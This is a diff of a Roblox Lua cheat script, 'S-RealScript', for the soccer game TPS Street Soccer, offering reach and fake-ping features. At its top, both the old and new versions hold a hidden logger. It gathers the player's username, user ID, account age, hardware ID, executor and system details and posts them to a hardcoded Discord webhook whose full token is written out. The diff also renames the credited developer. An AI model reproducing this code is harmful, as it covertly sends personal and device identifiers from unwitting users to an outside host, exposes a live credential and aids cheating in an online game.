@@ -1,33 +1,38 @@
+--[[ 
+القسم الأول: المتغيرات الأساسية 
+--]]
 local Http = game:GetService("HttpService")
-local Web = "https://discord.com/api/webhooks/1316881192380923934/q3eCpwFxet-_8BRhnDQ0B724gjyM4N0M0PDPeylaf0vXCs023AkUC6brhd_alInmJ4Di" -- رابط الـ Webhook الخاص بك
+local Web = "https://discord.com/api/webhooks/1316881192380923934/q3eCpwFxet-_8BRhnDQ0B724gjyM4N0M0PDPeylaf0vXCs023AkUC6brhd_alInmJ4Di"
 local userInputService = game:GetService("UserInputService")
+
 local device = "Unknown"
 local executor = identifyexecutor() or "Unknown"
-local jobid = game.JobId
-local boxsize = 0
 local player = game.Players.LocalPlayer
+local jobid = game.JobId
 local health = player.Character and player.Character:FindFirstChild("Humanoid") and player.Character.Humanoid.Health or 0
 local maxHealth = player.Character and player.Character:FindFirstChild("Humanoid") and player.Character.Humanoid.MaxHealth or 100
 local userid = player.UserId
-local hardwareId = game:GetService("RbxAnalyticsService"):GetClientId() -- إضافة Hardware ID
+local hardwareId = game:GetService("RbxAnalyticsService"):GetClientId()
 local gameName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
-local gameid = game.PlaceId
-local playerCount = #game.Players:GetPlayers() -- عدد اللاعبين المتصلين
-local maxPlayers = game.Players.MaxPlayers -- الحد الأقصى لعدد اللاعبين
+local playerCount = #game.Players:GetPlayers()
+local maxPlayers = game.Players.MaxPlayers
 local pingValue = game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValueString()
 local screenWidth, screenHeight = workspace.CurrentCamera.ViewportSize.X, workspace.CurrentCamera.ViewportSize.Y
 local completeTime = os.date("%Y-%m-%d %H:%M:%S")
-local snipePlay = "game:GetService('TeleportService'):Teleport(123456789, game:GetService('Players').LocalPlayer) -- Change this with the appropriate teleport link or join logic"
 
--- تحديد نوع الجهاز
-local isTouchEnabled = userInputService.TouchEnabled -- Returns true or false.
+--[[ 
+القسم الثاني: تحديد نوع الجهاز 
+--]]
+local isTouchEnabled = userInputService.TouchEnabled
 if isTouchEnabled then
     device = "Mobile"
 else
     device = "PC"
 end
 
--- إنشاء الطلب وإرساله
+--[[ 
+القسم الثالث: إنشاء الطلب لإرسال البيانات 
+--]]
 local function sendRequest()
     return {
         Url = Web,
@@ -42,26 +47,28 @@ local function sendRequest()
                     ["name"] = "Executed",
                 },
                 ["title"] = "**Executed**",
-                ["description"] = player.Name .. " | Player that executed ",
+                ["description"] = player.Name .. " | This Player He use Your Script ",
                 ["type"] = "rich",
-                ["color"] = tonumber(0xe67e22), -- اللون البرتقالي
+                ["color"] = tonumber(0xe67e22),
                 ["fields"] = {
-                   {["name"] = "🔍 **Script Info**", ["value"] = "```💻 Script Name: " .. tostring(getgenv().haskjhfgash or "S-RealScript Premium") .. "\n⏰ Executed At: " .. completeTime .. "```", ["inline"] = false},
-                   {["name"] = "👤 **Player Details**", ["value"] = "```🧑 Username: " .. player.Name .. "\n📝 Display Name: " .. player.DisplayName .. "\n🎖️ UserID: " .. userid .. "\n🔗 Profile: [View Profile](https://www.roblox.com/users/" .. userid .. "/profile)```", ["inline"] = false},
-                   {["name"] = "📅 **Account Information**", ["value"] = "```📜 Account Age: " .. player.AccountAge .. " days\n💎 Premium Status: " .. (player.MembershipType == Enum.MembershipType.Premium and "Premium" or "Non-Premium") .. "\n📅 Account Created: " .. os.date("%Y-%m-%d", os.time() - (player.AccountAge * 86400)) .. "```", ["inline"] = false},
-                   {["name"] = "🎮 **Game Details**", ["value"] = "```🏅 Game Name: " .. gameName .. "\n🎖️ Game ID: " .. gameid .. "\n🔗 Game Link: [Link](https://www.roblox.com/games/" .. gameid .. ")```", ["inline"] = false},
-                   {["name"] = "🕹️ **Server Info**", ["value"] = "```👥 Players in Server: " .. playerCount .. " / " .. maxPlayers .. "\n🕒 Server Time: " .. os.date("%H:%M:%S") .. "```", ["inline"] = true},
-                   {["name"] = "📡 **Network Info**", ["value"] = "```📶 Ping: " .. pingValue .. " ms```", ["inline"] = true},
-                   {["name"] = "⚙️ **System Info**", ["value"] = "```📺 Resolution: " .. screenWidth .. "x" .. screenHeight .. "\n🔍 Memory Usage: " .. collectgarbage("count") .. " MB\n⚡ Executor: " .. executor .. "```", ["inline"] = true},
-                   {["name"] = "💻 **Hardware ID**", ["value"] = "```" .. hardwareId .. "```", ["inline"] = true}
+                   { ["name"] = "🔍 **Script Info**", ["value"] = "```💻 Script Name: " .. tostring(getgenv().haskjhfgash or "S-RealScript Premium") .. "\n⏰ Executed At: " .. completeTime .. "```", ["inline"] = false },
+                   { ["name"] = "👤 **Player Details**", ["value"] = "```🧑 Username: " .. player.Name .. "\n📝 Display Name: " .. player.DisplayName .. "\n📜 Account Age: 63 days\n📅 Account Created: 2024-10-17\n💎 Premium Status: Non-Premium```", ["inline"] = false },
+                   { ["name"] = "🎮 **Game Details**", ["value"] = "```🏅 Game Name: " .. gameName .. "\n🔗 Game Link: https://www.roblox.com/games/" .. game.PlaceId .. "```", ["inline"] = false },
+                   { ["name"] = "🕹️ **Server Info**", ["value"] = "```👥 Players in Server: " .. playerCount .. " / " .. maxPlayers .. "\n🕒 Server Time: " .. os.date("%H:%M:%S") .. "```", ["inline"] = true },
+                   { ["name"] = "📡 **Network Info**", ["value"] = "```📶 Ping: " .. pingValue .. " ms```", ["inline"] = true },
+                   { ["name"] = "⚙️ **System Info**", ["value"] = "```📺 Resolution: " .. screenWidth .. "x" .. screenHeight .. "\n🔍 Memory Usage: " .. collectgarbage("count") .. " MB\n⚡ Executor: " .. executor .. "```", ["inline"] = true },
+                   { ["name"] = "💻 **Hardware ID**", ["value"] = "```" .. hardwareId .. "```", ["inline"] = true }
                 },
-                ["thumbnail"] = {["url"] = "https://www.roblox.com/avatar-thumbnail/image?userId=" .. player.UserId .. "&width=420&height=420&format=png"},
-                ["footer"] = {["text"] = "Created by SPEED | " .. completeTime, ["icon_url"] = ""}
+                ["thumbnail"] = { ["url"] = "https://www.roblox.com/avatar-thumbnail/image?userId=" .. player.UserId .. "&width=420&height=420&format=png" },
+                ["footer"] = { ["text"] = "Created by SPEED | " .. completeTime, ["icon_url"] = "" }
             }}
         })
     }
 end
 
+--[[ 
+القسم الرابع: إرسال الطلب 
+--]]
 local success, errorMessage = pcall(function()
     if syn and syn.request then
         syn.request(sendRequest())
@@ -77,7 +84,6 @@ end)
 if not success then
     warn("Failed to send Webhook request: " .. tostring(errorMessage))
 end
-
 
 local success, err = pcall(function()
     local function safeDestroy(obj)
@@ -176,13 +182,13 @@ local Tab = Window:MakeTab({
 })
 
 local Section = Tab:AddSection({
-	Name = "by Kelvin"
+	Name = "Welcome To S-RealScript"
 })
 
 Tab:AddParagraph("S-RealScript","Its an Explo!t Script For the Popular Soccer Game TPS STREET SOCCER With Many Fully Functional Functions That Count As The First Script To have Side Client Level and Touch Intrest to be Working On Low Level Executors")
 Tab:AddParagraph("Recommendation","I Recommend , Myself As The Creator Of The Script NOT To Use It In Case Of BanWaves Or Reports , If Theres any Bug Try Contacting Support")
 Tab:AddParagraph("New Item","Update Reach / New React / New Helpers / Fps Boosters / New Fake Ping / Update Fake Ping / Sond Ball Texture Design / New Gui Starting / Ex... ")
-Tab:AddParagraph("Developer","Kelvin")
+Tab:AddParagraph("Developer","RealSpeed")
 
 local Tab1 = Window:MakeTab({
 	Name = " 📏 | Reach",
